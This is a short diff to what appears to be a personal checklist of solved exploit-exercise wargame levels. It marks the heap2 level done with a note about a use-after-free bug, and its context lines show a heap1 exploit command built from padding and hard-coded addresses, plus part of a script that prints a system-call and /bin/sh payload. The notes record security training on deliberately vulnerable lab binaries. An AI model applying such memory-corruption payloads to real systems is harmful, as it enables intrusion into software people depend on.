@@ -36,7 +36,10 @@ print padding + return_op + call_system + after_system_execution + bin_sh_path
 ```
 ./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
 ```
-- [ ] heap2
+- [x] heap2
+```
+exploiting use-after-free bug
+```
 - [ ] heap3
 
 ## Network
